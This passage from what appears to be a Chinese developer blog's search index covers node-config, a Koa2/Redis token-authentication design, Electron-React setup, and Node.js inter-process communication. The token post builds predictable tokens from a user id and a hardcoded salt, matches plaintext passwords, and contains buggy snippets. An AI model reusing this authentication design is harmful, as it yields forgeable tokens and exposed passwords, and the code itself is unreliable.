进行一个典型的布局。 123456789101112131415161718&lt;div class=\"flex flex-column\"&gt; &lt;header class=\"flex flex-column\"&gt; &lt;nav style=\"height: 50px\" class=\"flex flex-row flex-ai-center\"&gt;&lt;/nav&gt; &lt;div class=\"flex flex-1 flex-center\"&gt; &lt;/div&gt; &lt;/header&gt; &lt;section class=\"flex flex-row\"&gt; &lt;div style=\"width: 300px\"&gt;&lt;/div&gt; &lt;div class=\"flex flex-1\"&gt;&lt;/div&gt; &lt;div style=\"width: 300px\"&gt;&lt;/div&gt; &lt;/section&gt; &lt;footer class=\"flex flex-ai-center\"&gt; &lt;/footer&gt;&lt;/div&gt; 这个布局是： 整个页面分为 header，content，footer 三个基本布局。 header 内容居中。 nav 内容垂直居中。 content 分为三列，中间弹性，两边固定。 footer 内容垂直居中。","categories":[{"name":"Sass","slug":"Sass","permalink":"http://me.lizhooh.com/categories/Sass/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"Sass","slug":"Sass","permalink":"http://me.lizhooh.com/tags/Sass/"}]},{"title":"使用 node-config 管理应用配置文件","slug":"Nodejs/使用 node-config 管理应用配置文件","date":"2017-12-02T03:01:01.000Z","updated":"2021-06-15T06:10:52.843Z","comments":true,"path":"/stories/2017/12/Nodejs/使用 node-config 管理应用配置文件/","link":"","permalink":"http://me.lizhooh.com/stories/2017/12/Nodejs/使用 node-config 管理应用配置文件/","excerpt":"前言在编写 Nodejs 应用时，几乎都需要写一些配置文件，以应付万变的情况，其中最大的好处就是可以根据配置项快速的修改一些配置。比如一些数据库的配置项，development、production、test 不同开发环境的配置项。 在以往，可能自己去写一个配置文件：config.js，在不同的层级的文件里去引用，可是这样可能会遇到引用层级很深的路径，还不方便维护。 好，为了解决这些问题，引入 node-config 模块的使用。","text":"前言在编写 Nodejs 应用时，几乎都需要写一些配置文件，以应付万变的情况，其中最大的好处就是可以根据配置项快速的修改一些配置。比如一些数据库的配置项，development、production、test 不同开发环境的配置项。 在以往，可能自己去写一个配置文件：config.js，在不同的层级的文件里去引用，可是这样可能会遇到引用层级很深的路径，还不方便维护。 好，为了解决这些问题，引入 node-config 模块的使用。 node-confignode-config 就是一个为您的应用程序部署组织分层配置。它允许您定义一组默认参数，并将其扩展到不同的部署环境（development, qa, staging, production 等），并且还支持多 Nodejs 部署。 安装： 1npm install --save config 基本使用node-config 支持多种环境的配置文件，它会自动根据当前的 process.env.NODE_DEV 进行环境判断从而去加载对应的配置文件。 默认情况下，node-config 会去读取应用跟目录下的 config 文件夹，再从 config 文件夹里读取对应的配置文件。 1234567app├── config // Nodejs 应用配置文件夹│ ├── default.json // 默认配置文件│ ├── development.json // 开发环境配置文件│ ├── production.json // 生成环境配置文件│ ├── test.json // 测试环境配置文件│ └── mydev.json // 自定义环境配置文件 1234567891011121314// 创建完成后在 default.json 文件里编写：&#123; \"name\": \"app\"&#125;// 在 development.json 文件里编写：&#123; \"name\": \"app dev\"&#125;// 在 production.json 文件里编写：&#123; \"name\": \"app pro\"&#125; 好了，编写配置文件完成后，就可以在应用中引用了。 123// in app.jsconst config = require('config');console.log(config); // Config &#123; name: 'app dev' &#125; 如果你使用 node app.js 启动，就会看到输出 app dev，因为默认启动是 development 模式。 为了统一各平台的环境设置，将使用 cross-env 来设置 NODE_ENV。 12345\"scripts\": &#123; \"start\": \"cross-env NODE_ENV=production node index\", \"dev\": \"cross-env NODE_ENV=development node index\", \"jest\": \"cross-env NODE_ENV=test jest\"&#125;, 为什么这样做？因为 NODE_DEV 在不同平台上的设置是不同的，为了统一设置，把这些坑爹的兼容性交给 cross-env 就对了。 加载顺序NODE_ENV=production 时 node-config 会自动加载 default.json、production.json 配置文件。 也就是说 node-config 先会加载 default.json 文件，接着去加载 production.json 文件。 如果 production.json 文件里的属性名称与 default.json 里重名了会怎样处理？node-config 的做法是后者覆盖前者。 最后的配置对象是： 1234const config = &#123; ...default, ...production&#125;; 其次是，配置的覆盖是进行深度覆盖的，也就是说在 default 进行了如下配置： 123456789&#123; \"name\": \"app\", \"version\": \"0.1.0\", \"mongodb\": &#123; \"host\": \"localhost\", \"port\": 27017, \"db\": \"test\" &#125;,&#125; 在 development.json 进行如下配置： 12345&#123; \"mongodb\": &#123; \"db\": \"dev\" &#125;&#125; 最后输出的配置项是： 123456789&#123; \"name\": \"app\", \"version\": \"0.1.0\", \"mongodb\": &#123; \"host\": \"localhost\", \"port\": 27017, \"db\": \"dev\" &#125;,&#125; JavaScript 配置文件有时候，一些配置项是需要动态的计算的，比如配置一个 appRoot 路径，那么就需要使用 __dirname 来配置。node-config 对 .js 配置文件同样有效。 像动态计算的配置项，最好放在 default.js 里： 12345const path = require('path');module.exports = &#123; root: path.join(__dirname, '../'),&#125; 其他环境的配置文件仍然是 .json 这样还是会生效的，无论如何它们都会被转化为 Object 来统一处理。 那么 config 文件夹里包含了： 1234567app├── config // Nodejs 应用配置文件夹│ ├── default.js // 默认配置文件│ ├── development.json // 开发环境配置文件│ ├── production.json // 生成环境配置文件│ ├── test.json // 测试环境配置文件│ └── mydev.json // 自定义环境配置文件 此外还提供延迟功能，让你根据配置对象的上下文进行计算。 1234567891011121314151617// In default.js// using defer functions is optional. See example and docs below.const defer = require('config/defer').deferConfig;module.exports = &#123; firstName: undefined, lastname: undefined; fullName: defer(function () &#123; return this.firstName + ' ' + this.lastName; &#125;&#125;// Then in config/production.js:module.exports = &#123; firstName: \"Jane\", lastName: \"Doe\",&#125; 最后在 production 环境下，得出 fullName 的值为 Jane Doe。 多个节点实例如果你的后端服务需要多个 Nodejs 节点，那么也意味着需要多个配置文件。 为了支持在机器上运行的每个应用程序实例的不同配置，NODE_APP_INSTANCE 环境变量将被检查，并用于加载实例特定的文件。 如果 NODE_APP_INSTANCE = 3 这时候会先加载 default.json 文件，接着加载 default-3.json 文件。如果 NODE_APP_INSTANCE = node1 这时候会先加载 default.json 文件，接着加载 default-node1.json 文件。 也就是说，加载的顺序最先的还是 default，接着加载对应的实例配置项：default-{NODE_APP_INSTANCE}.json。 如果 NODE_APP_INSTANCE = node1 并且 NODE_ENV = test 这时候会先加载 default.json 文件，接着加载 default-node1.json，再去加载 test.json 文件，最后还会加载 test-node1.json。 这里有一个前提是：如果这些文件存在。不存在也没关系，它不会报错，只会默默的忽视。 APInode-config 只有 3 个 api：get、has、util。 get 方法无论在那个文件 node-config 返回的是一个配置对象。node-config 提供的 get 方法让你获取某个属性值。 12const config = require('config');config.get('name'); // app dev 如果 get 一个不存在的属性值，那么就会抛出错误。 如果不想抛出错误，也可以直接使用对象的方式： 12const config = require('config');config.name; // app dev 值得幸运的是 node-config 对属性值进行 setter 无效化，所以 config.name = &#39;new app&#39; 是不会修改 name 的值的，在其他模块里输出时还是 app dev。 has 方法如果您想查看是否存在配置值，请使用 has() 方法。 123if (config.has('dbConfig')) &#123; // ...&#125; 这可以作为 get() 绕过 try / catch 块的替代方法。 has() 不会抛出异常，并且当且仅当配置文件为所提供的键定义了一个值时才返回 true。请注意 null 也是一个定义的值。has() 如果传递的参数是 null 或者 undefined 只是简单地返回，则不会抛出异常或 false，也就是只要有值，has 就会返回 true。 util 对象node-config 提供了 util 工具对象，它有以下 API： util.cloneDeep 对象深拷贝。 util.diffDeep 返回包含两个对象之间不同的所有元素的对象。 util.equalsDeep 两个对象进行深对比。 util.extendDeep 用一个或多个对象扩展另一个对象（深度）。 util.getConfigSources 返回 config 文件夹的文件描述对象。 util.getEnv 获取配置环境变量的当前值。 util.loadFileConfigs 使用与主配置目录相同的约定来读取给定的目录。 util.makeHidden 使对象属性隐藏，因此枚举对象的元素时不会出现。 util.makeImmutable 使一个 js 对象属性不可变。 util.toObject 返回当前配置文件的 Object 深副本。 上面的 api 都是以函数的形式使用： 1const bfObject = config.util.cloneDeep(fromObject); 详细说明参考：Using Config Utilities 在 Webpack 中使用node-config 不仅仅可以用于后端 Nodejs 应用，同时也可以用于前端构建开发环境。 因为 Webpack 需要读取 client.js 文件，那么在运行时把 default.json 文件写进 client.js 文件里，再让 Webpack 去读取 client.js 文件的配置项。 123456789101112131415161718// webpack-config.jsconst config = require('config')const fs = require('fs')const path = require('path');// This will take the config based on the current NODE_ENV and save it to 'build/client.json'// Note: If '/build' does not exist, this command will error; alternatively, write to '/config'.// The webpack alias below will then build that file into the client build.fs.writeFileSync(path.resolve(__dirname, 'build/client.json'), JSON.stringify(config))module.exports = &#123; // ... other webpack config resolve: &#123; alias: &#123; config: path.resolve(__dirname, 'build/client.json') &#125; &#125;&#125; 参考资料 https://github.com/lorenwest/node-config","categories":[{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/categories/Nodejs/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"}]},{"title":"Koa2 基于 Redis 的 Token 验证设计","slug":"Nodejs/Koa/Koa2 基于 Redis 的 Token 验证设计","date":"2017-11-30T05:18:23.000Z","updated":"2021-06-15T06:10:52.834Z","comments":true,"path":"/stories/2017/11/Nodejs/Koa/Koa2 基于 Redis 的 Token 验证设计/","link":"","permalink":"http://me.lizhooh.com/stories/2017/11/Nodejs/Koa/Koa2 基于 Redis 的 Token 验证设计/","excerpt":"前言会话管理基本是每个应用的必须功能。会话管理主要有 Session 和 Token 两种方式，它们的关注点是不同的。 所谓 Session 认证只是简单的把 User 信息存储到 Session 里，因为 sid 的不可预测性，暂且认为是安全的，这是一种认证方式。Token 的意思是令牌，是用户身份的验证方式，通过签发 Token 给用户，用户在下次查询时再进行 Token 的验证，就像用钥匙开门一样。 会话管理相关的几篇文章： Nodejs 基于 Mongodb 的 Session 会话管理 前端路由守护 与 后端用户认证","text":"前言会话管理基本是每个应用的必须功能。会话管理主要有 Session 和 Token 两种方式，它们的关注点是不同的。 所谓 Session 认证只是简单的把 User 信息存储到 Session 里，因为 sid 的不可预测性，暂且认为是安全的，这是一种认证方式。Token 的意思是令牌，是用户身份的验证方式，通过签发 Token 给用户，用户在下次查询时再进行 Token 的验证，就像用钥匙开门一样。 会话管理相关的几篇文章： Nodejs 基于 Mongodb 的 Session 会话管理 前端路由守护 与 后端用户认证 Token 验证流程基于 Token 的身份验证方法，主要有几步： 客户端使用用户名和密码，请求登录。 服务端收到请求，去验证用户名与密码的合法与正确性。 验证成功后，服务端会签发一个 Token，接着把这个 Token 发送给客户端，同时把 Token 存储到 Redis 里（或其它存储方式）。 客户端收到 Token 以后可以把它数据持久化，比如放在 Cookie 里或者 LocalStorage 里。 客户端每次向服务端请求资源的时候，都需要在 http header 里（或其它地方）携带服务端签发的 Token，以便服务端进行验证。 服务端收到请求，就会去验证客户端请求里面带着的 Token。验证方式包括了正确性，时间有效性。如果验证成功，就向客户端返回所需请求的数据。 服务端在验证 Token 时如果发现 Token 超时（一般设置为 7 天，30 天），就会把 Token 销毁，并返回通知客户端重新登录，获取新的 Token。 当客户端主动注销时，就会通知服务器把 Token 销毁。 Token 的流程就是这么简单，主要是如何创建 Token 、验证 Token 和存储 Token 的问题。 Token 设计Token 的设计分为基本加密与 URL 签名，以及 AES 对称加密。而 AES 对称加密太复杂，暂时不管它。 Token 存储Token 的存储，主要考虑几个问题： 在每次 API 验证时都要使用 Token，这种高并发的尽量把它存储在内存里，Redis 就是一个高速缓存数据库。 Token 的信息，允许丢失，也没有绝对的持久化。这样的话存储在内存数据库里再好不过了，那就是 Redis 了。 Token 的数据存储尽量简单，主要把 Token 与 User id 的对应关系连接好即可。 12345&#123; id: '', // Mongodb 的 User id token: '', // token 值 time: '', // 签发时间，用于判断是否超时&#125; 这样就简单设计好了 token 的存储模型。 一般查询的时候会经历几次查询： 1234567// 从 Redis 里查询 user idconst date = store.get('token');// 从 Mongodb 的查询用户信息if (date !== null) &#123; const userData = User.findOne(&#123; _id: date.id &#125;);&#125; 如果想把 Mongodb 的查询也省了，可以考虑不部分用户信息存到 Token 的模型里，主要看业务场景。 基本加密当创建 Token 时，使用 sha256 + slat 的方式去创建 Token。 123456const crypto = require('crypto');const SALT = 'sXzevrZQwBy190wBH9x2YraFyYbb0Gp2'; // 盐function createToken(userid) &#123; return crypto.createHash('sha256').update(userid + salt).digest('hex');&#125; URL 签名写过爬虫都知道怎么回事，如果 Token 被人知道了，只要保存 Token，那么就等于拿到了钥匙，直接就可以开门了。虽然 Token 有超时时间，但是至少能用几天吧，就算超时了重新申请一个即可。 为了解决这种缺点，需要对每个 URL 做一个签名，这种签名方式，就叫做「URL 签名」。URL 签名最简单的方式是：uid（用户唯一的身份标识）、time（当前时间的时间戳）、sign（签名，由 token 的前几位 + 盐以哈希算法压缩成一定长的十六进制字符串）生成的 Token。 在第一次登录的时候，客户端拿到 token 之后，在本地进行数据缓存。在之后的 API 请求并不需要带上 token，而上带上sign。 12345// slat 是固定的，也可以根据每个 api 配一个 saltconst sign = sha1('http://test.com/user/info?token=ajdkasjda23123jkh3k21' + salt);console.log(sign);// eiqowem3m12kkhhisdDSJDd2131das 并且附带其他信息： 1http://test.com/user/info?key=abc&amp;t=1512037418851&amp;sign=eiqowem3m12kkhhisdDSJDd2131das 实际上并不会把 sign 放在 query 上，同时也不叫 sign，完全取决于你的设计，无论如何，总是要隐藏起来，API 不被别人利用。 超时处理对于 Token 超时，可以利用 Redis 设置键的生存时间或过期时间，或者在验证时对 time 字段进行对比。 对于设置过期时间，Redis 有四个不同的命令可以用于设置键的生存时间（键可以存在多久）或过期时间（键什么时候会被自动删除）。 Explre &lt;key&gt; &lt;ttl&gt; 设置 key 的生存时间设置为 ttl 秒。 Pexpire &lt;key&gt; &lt;ttl&gt; 设置 key 的生存时间设置为 ttl 毫秒。 Expireat &lt;key&gt; &lt;timestamp&gt; 设置 key 的过期时间设置为 timestamp 所指定的秒数时间戳。 Pexpireat &lt;key&gt; &lt;timestamp&gt; 设置 key 的过期时间设置为 timestamp 所指定的毫秒数时间戳。 ttl 指的是秒数/毫秒数，timestamp 指定的是时间戳。 1234567127.0.0.1:6379&gt; Set name abcOK127.0.0.1:6379&gt; Get name\"abc\"127.0.0.1:6379&gt; Explre name 3 # 3 秒后自动删除127.0.0.1:6379&gt; Get name(nil) 对于手动判断超时，可以这样： 1234if (Date.now() - data.time &gt; 3600 * 24 * 7) &#123; // 删除 store.destroy('token');&#125; Store定义一个 Store 类，用于 Token Redis 存储相关操作，包括了：创建，查询，删除。考虑到简单，使用 Get 结构，命名为前缀 + Token 的方式。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152const colors = require('colors');const Redis = require('ioredis');const redis = new Redis();class Store &#123; constructor(key, options) &#123; this.redis = redis; this.key = key || 'TOKEN-'; this.options = &#123; timeout: 3600 * 24 * 7, // 7 天 ...options, &#125; &#125; // 获取 token async get(tk) &#123; try &#123; let res = JSON.parse(await this.redis.get(this.key + tk)); if (Date.now() - res.time &gt; this.options.timeout) &#123; await this.destroy(tk); return null; &#125; return res; &#125; catch (err) &#123; console.error('Token Store:get Error'.red, err); &#125; &#125; // 设置 token async set(tk, val) &#123; try &#123; return await this.redis.set(this.key + tk, JSON.stringify(val));; &#125; catch (err) &#123; console.error('Token Store:set Error'.red, err); &#125; &#125; // 销毁 token async destroy(tk) &#123; try &#123; return await this.redis.del(this.key + tk);; &#125; catch (err) &#123; console.error('Token Store:destroy Error'.red, err); &#125; &#125;&#125;module.exports = Store; 定义完成后就可以在路由的使用了，比如请求某个资源时，通过验证 Token 来决定下一步动作。 12345678910const store = new Store();router.get('/auto', ctx =&gt; &#123; if (store.get(ctx.header.token) !== null) &#123; // 通过验证 &#125; else &#123; // 验证失败 &#125;&#125;); 登录在上面定义的存储格式是： 12345&#123; id: '', // Mongodb 的 User id token: '', // token 值 time: '', // 签发时间，用于判断是否超时&#125; 登录时大致做以下操作： 1234567891011121314function login(ctx =&gt; &#123; // 获取账号密码 const &#123; account, password &#125; = ctx.request.body; // 先做一轮验证 // ... // 验证用户，得到 _id const id = await User.findOne(&#123; account, password &#125;, &#123; _id: 1 &#125;); // 创建 Token const token = createToken(); // 存储 token store.set(token, &#123; id, token, time: Date.now() &#125;); // 完成后，返回登录成功 ctx.body = &#123; success: true &#125;;&#125;); 注册注册时，大致需要以下操作： 1234567891011121314function signIn(ctx =&gt; &#123; // 获取账号密码 const &#123; account, password &#125; = ctx.request.body; // 先做一轮验证 // ... // 创建用户 const res = await User.create(&#123; account, password &#125;); // 创建 token const token = createToken(); // 存储 token store.set(token, &#123; id, token, time: Date.now() &#125;); // 完成后，返回注册成功 ctx.body = &#123; success: true &#125;;&#125;); 参考资料 https://www.npmjs.com/package/koa-session2","categories":[{"name":"Koa","slug":"Koa","permalink":"http://me.lizhooh.com/categories/Koa/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"Koa","slug":"Koa","permalink":"http://me.lizhooh.com/tags/Koa/"},{"name":"Redis","slug":"Redis","permalink":"http://me.lizhooh.com/tags/Redis/"}]},{"title":"把 Electron-Vue 配置成 React 项目","slug":"Electron/把 Electron-Vue 配置成 React 项目","date":"2017-11-25T08:45:49.000Z","updated":"2021-06-15T06:10:52.814Z","comments":true,"path":"/stories/2017/11/Electron/把 Electron-Vue 配置成 React 项目/","link":"","permalink":"http://me.lizhooh.com/stories/2017/11/Electron/把 Electron-Vue 配置成 React 项目/","excerpt":"前言Electron-Vue 是一个很好的 Electron + Vue 脚手架。在之前已经介绍过它了：使用 Electron-vue 构建桌面应用 但是它只配置的 Vue 全家桶，我想用 React 怎么办？Github 上倒是有不少 electron react boilerplate，但是集成的东西太多了，不好弄啊。 没办法只能基于 Electron-Vue 原来的基础把 Vue 强行配置成 React。\\(“▔□▔)/，最后发现效果很不错喔。 已经修改完成的 Electron-React 模版： https://github.com/Lizhooh/electron-react","text":"前言Electron-Vue 是一个很好的 Electron + Vue 脚手架。在之前已经介绍过它了：使用 Electron-vue 构建桌面应用 但是它只配置的 Vue 全家桶，我想用 React 怎么办？Github 上倒是有不少 electron react boilerplate，但是集成的东西太多了，不好弄啊。 没办法只能基于 Electron-Vue 原来的基础把 Vue 强行配置成 React。\\(“▔□▔)/，最后发现效果很不错喔。 已经修改完成的 Electron-React 模版： https://github.com/Lizhooh/electron-react 开始开始之前，先使用 Electron-Vue 初始化一个模版。 1vue init simulatedgreg/electron-vue my-project 初始化之后，先不要 npm install，因为有些模块是需要去除了。 babel可以看到 .babelrc 文件里 presets 配置了 stage-0。这是一个万金油配置项，stage-0 代表着只有通过草案 0 就可以使用了，包括了 ES6，ES7，ES8 的内容。 接下来在 .babelrc 里每个 presets 里添加 react，这样它就可以识别 jsx 语法了。 1234567\"presets\": [ [\"env\", &#123; \"modules\": false &#125;], \"react\", \"stage-0\"] 之后安装对应模块： 1npm install --save-dev babel-preset-react 去除 Vue 的配置配置 React 开发环境只需要配置好 jsx 就可以了，这样就可以把 vue 的 loader 去掉，还要把 Vue 全家桶去掉。 12npm uninstall --save vue vuex vue-router axiosnpm uninstall --save-dev vue-html-loader vue-loader vue-style-loader vue-template-compiler 之后在 Webpack 配置项里去掉 loader，删除一下代码，顺便把对应的注释也删除（因为删除会导致行号变化，可以先注释后再把注释删除）。 在 .electron-vue/webpack.renderer.config.js 文件里 123456789101112131415161718192021222324252627282930313233// 21 行let whiteListedModules = ['vue']// 28 - 30 行externals: [ ...Object.keys(dependencies || &#123;&#125;).filter(d =&gt; !whiteListedModules.includes(d))],// 40 - 42 行&#123; test: /\\.html$/, use: 'vue-html-loader'&#125;,// 53 - 65 行&#123; test: /\\.vue$/, use: &#123; loader: 'vue-loader', options: &#123; extractCSS: process.env.NODE_ENV === 'production', loaders: &#123; sass: 'vue-style-loader!css-loader!sass-loader?indentedSyntax=1', scss: 'vue-style-loader!css-loader!sass-loader' &#125; &#125; &#125;&#125;,// 125 行'vue$': 'vue/dist/vue.esm.js'// 127 行，把 vue 改为 jsxextensions: ['.js', '.jsx', '.json', '.css', '.node'] 同理，把 webpack.web.config.js 里 vue 相关的 loader 也删除了。 删除之后就不能使用 Vue 了，但是可以稳稳的使用 React。 添加 react之后就可以添加 react 模块。 1npm install --save react@latest react-dom@latest 改头换面既然要把 Electron-Vue 改造成 Electron-React，就不能每次启动时都看到 vue 的字眼，那就彻底一点。 先是把文件夹 .electron-vue 改名为 .electron-react。 接着把 package.json 里所有的 .electron-vue 改成 .electron-react（ctrl + F 匹配一次性修改），包括了一些 vue project 的说明。 再把 .electron-react/dev-runner.js 里的 vue 改成 react，并把颜色改成蓝色 123456789101112131415161718// 148 行 greeting 函数function greeting() &#123; const cols = process.stdout.columns let text = '' if (cols &gt; 104) text = 'electron-react' else if (cols &gt; 76) text = 'electron-|react' else text = false if (text) &#123; say(text, &#123; colors: ['blue'], font: 'simple3d', space: false &#125;) &#125; else console.log(chalk.yellow.bold('\\n electron-react')) console.log(chalk.blue(' getting ready...') + '\\n')&#125; 效果如下图： 接着把 src 里 vue 的代码去掉，改成 react 的即可。之后 npm install，该干嘛就干嘛， Less/Sass之后可以添加 Less/Sass 的 loader。 12npm install --save-dev less less-loadernpm install --save-dev node-sass sass-loader 接着修改 Webpack 配置，添加 less/sass loader。 在 .electron-react/webpack.renderer.config.js 文件里 12345678&#123; test: /\\.scss$/, loader: 'style-loader!css-loader!sass-loader',&#125;,&#123; test: /\\.less$/, loader: 'style-loader!css-loader!less-loader',&#125;, 之后，就可以在文件里直接引入 less/scss 文件。 12import '@/style/app.less';import '@/style/app.scss'; 小结好了，改到这里基本已经全部修改完成了。 总结了一下步骤： 使用 vue-cli 初始化项目。 在 babelrc 里配置 react babel。 去除 vue 相关模块和 loader。 添加 react，react-dom 模块 把 .electron-vue 改名为 .electron-react，并修改启动 logo。 添加 less/sass loader 配置项。 修改 src 代码，安装所有模块。 如果把这 7 个步骤写成命令行自动化形式，是不是会很炫酷？有空时再研究一下，怎么写个自动任务去完成这几个步骤。\\(“▔□▔)/ 补充目前，打包 Electron 应用主要是两个工具： electron-packager electron-builder 但是在打包时会出现网络被墙了的情况，对于被墙的情况我也很恼火啊，最近 VPN 又全下线了。 如果遇到打包被墙的问题，可以尝试这样的操作： electron-packager在 .electron-react/build.config.js 配置项里添加： 123\"download\": &#123; \"mirror\": \"https://npm.taobao.org/mirrors/electron/\"&#125; 如果是命令行，则添加参数： 1--download.mirror=https://npm.taobao.org/mirrors/electron/ electron-builder在 package.json 的 build 里添加： 123\"electronDownload\": &#123; \"mirror\": \"https://npm.taobao.org/mirrors/electron/\"&#125;, 如果是命令行，则添加参数： 1--electronDownload.mirror=https://npm.taobao.org/mirrors/electron/ 参考资料 https://github.com/electron-userland/electron-packager/blob/master/docs/api.md#download https://www.electron.build/configuration/configuration","categories":[{"name":"Electron","slug":"Electron","permalink":"http://me.lizhooh.com/categories/Electron/"}],"tags":[{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"Electron","slug":"Electron","permalink":"http://me.lizhooh.com/tags/Electron/"}]},{"title":"多个 Nodejs 进程间通信","slug":"Nodejs/多个 Nodejs 进程间通信","date":"2017-11-24T15:06:55.000Z","updated":"2021-06-15T06:10:52.844Z","comments":true,"path":"/stories/2017/11/Nodejs/多个 Nodejs 进程间通信/","link":"","permalink":"http://me.lizhooh.com/stories/2017/11/Nodejs/多个 Nodejs 进程间通信/","excerpt":"前言Nodejs 是单线程运行的，有时候不得不启动多个 Nodejs 进程去分别做不同类型的任务。但是带来的问题是：不同的 Nodejs 进程如何通信？ 常见的多进程通信进程间通信方式： 共享内存, 信号量。 消息队列，信号。 文件，匿名管道/命名管道，套接字。","text":"前言Nodejs 是单线程运行的，有时候不得不启动多个 Nodejs 进程去分别做不同类型的任务。但是带来的问题是：不同的 Nodejs 进程如何通信？ 常见的多进程通信进程间通信方式： 共享内存, 信号量。 消息队列，信号。 文件，匿名管道/命名管道，套接字。 net.socketNodejs 有 socket 相关的 api，可以使用 net 模块创建 TCP 连接。与 http 相比它实在是轻小很多。 下面创建一个 tcp 服务端，接收客户端的数据，并反馈给对方。 server.js 1234567891011121314151617181920212223242526const net = require('net');const server = net.createServer(&#123; allowHalfOpen: true,&#125;, socket =&gt; &#123; // 'connection' listener console.log('socket connected'); let data = []; socket.on('data', (chunk) =&gt; &#123; data.push(chunk); &#125;); socket.write(':'); socket.on('end', () =&gt; &#123; socket.end('Hello ' + data.toString()); console.log('socket disconnected'); &#125;);&#125;) .on('error', (err) =&gt; &#123; console.error(err); throw err; &#125;) .listen(8124, () =&gt; &#123; console.log('server bound: 8124.'); &#125;); client.js 1234567891011121314const net = require('net');const client = net.createConnection(&#123; host: 'localhost', port: 8124 &#125;, () =&gt; &#123; //'connect' listener console.log('connected to server!'); client.write('world!');&#125;) .on('data', (data) =&gt; &#123; console.log(data.toString()); client.end(); &#125;) .on('end', () =&gt; &#123; console.log('disconnected from server'); &#125;); 在客户端可以看到输出 Hello world!。 使用 net.Socket 可以很灵活的自己设计数据传输协议，不过开发难度比较大。 socket.io单单使用 Nodejs 的 net 模块还是比较不好控制。下面就是使用 socket.io 来进行多个 Nodejs 进程之间的通信。 server.js 12345678910const io = require('socket.io')(3000);io.on('connection', socket =&gt; &#123; console.log(socket.id); socket.emit('news', 'Hello'); socket.on('news', data =&gt; &#123; console.log(data); &#125;);&#125;); client.js 1234567const io = require('socket.io-client');const socket = io('http://localhost:3000');socket.on('news', data =&gt; &#123; console.log(data); socket.emit('news', 'Hi');&#125;); 这种模式是一个 Nodejs 进程作为 Server，其余的 Nodejs 进程作为 Client，所有的数据广播都在 Server 里完成。 socket.io-redis在 Socket.io 文档里有提到： 通过使用 socket.io-redis 适配器运行 socket.io，您可以在不同的进程或服务器上运行多个 socket.io 实例，这些进程或服务器可以相互广播和发送事件。如果您需要从 nonsocket.io 进程向 socket.io 实例发送事件，则应该使用 socket.io-emitter。 这两个话非常重要，一句告诉你可以使用 socket.io-redis 进行多进程通信，但是问题是需要 socket.io 服务。另一句告诉你，也可以从非 socket.io 向 socket.io 发送消息。但是它们都需要 redis 作为中间层处理。 在这之前先启动 Redis 服务： 1redis-server 与上面的 Server - Client 模式相比，socket.io-redis 使用 Redis 作为中间层，这样就没有了 Server 与 Client 的概念，因为每个 Nodejs 进程都是属于同一个层次的。但是每个进程都需要监听一个端口。 假设现在有两个 Nodejs 进程 A、B，对应 a.js，b.js。 a.js 监听 3000 端口 12345678910111213141516171819const io = require('socket.io')(3000);const redis = require('socket.io-redis');io.adapter(redis(&#123; host: 'localhost', port: 6379,&#125;));// 需要使用 adapterio.of('/').adapter.on('time', time =&gt; &#123; console.log(time);&#125;)setTimeout(() =&gt; &#123; // 广播消息 io.of('/').adapter.customRequest('你好小明', (err, replies) =&gt; &#123; // 应答 console.log(replies); &#125;);&#125;, 5000); b.js 监听 3001 端口 123456789101112131415const io = require('socket.io')(3001);const redis = require('socket.io-redis');io.adapter(redis(&#123; host: 'localhost', port: 6379,&#125;));setTimeout(() =&gt; &#123; // 接收消息 io.of('/').adapter.customHook = (data, reply) =&gt; &#123; console.log(data); // 回复 reply('早上好，小美'); &#125;&#125;, 5000); 分别运行两个 Nodejs 进程运行后看到： 在 a.js 输出 [ null, &#39;早上好，小美&#39; ] 在 b.js 输出 你好小明 那么就这样简单的完成了两个 Nodejs 进程的通信。 错误处理错误处理，给对应的适配器添加错误事件即可。 12345678910111213const io = require('socket.io')(3000);const redis = require('socket.io-redis');const adapter = redis('localhost:6379');adapter.pubClient.on('error', (err) =&gt; &#123; // ...&#125;);adapter.subClient.on('error', (err) =&gt; &#123; // ...&#125;);io.of('/').adapter.on('error', (err) =&gt; &#123; // ...&#125;); APIsocket.io-redis 有以下的 API： adp.clients(rooms: Array, fn: Function) 返回连接到 rooms 所有 Nodejs 的客户端 id 的列表。 adp.clientRooms(id: String, fn: Function) 返回包含给定 id 的客户端加入的房间列表。 adp.allRooms(fn: Function) 返回所有房间的列表。 adp.remoteJoin(id: String, room: String, fn: Function) 使给定 id 的 socket.io 加入房间，回调将在 socket.io 加入房间时调用。 adp.remoteLeave(id: String, room: String, fn: Function) 使给定 id 的 socket.io 离开房间，回调将在 socket.io 离开房间时调用。 adp.remoteDisconnect(id: String, close: Boolean, fn: Function) 使给定 id 的 socket.io 断开连接，回调将在 socket.io 断开连接时被调用。如果 close 设置为 true，它将关闭底层套接字。 adp.customRequest(data: Object, fn: Function) 向每个节点发送一个请求消息，这个请求将通过该 customHook 方法进行应答。 小结多个 Nodejs 进程之间进行通信，有多种方式： 使用共享内存，信号量。这种方式可以通过 child_process 模块实现。 使用套接。这种方式可以使用 net，http，websocket 模块实现，还可以使用 socket.io 来实现（推荐）。 使用共享文件。这种方式通过监听文件的变化来实现，不过效率不理想（不推荐）。 使用订阅发布，响应式数据库。通过 Redis 这些数据库，并利用它们的特性进行多进程通信。 参考资料 https://socket.io/docs/rooms-and-namespaces/ https://github.com/socketio/socket.io-redis https://github.com/socketio/socket.io-emitter","categories":[{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/categories/Nodejs/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"}]},{"title":"在 React 里使用 Mobx","slug":"MobX/在 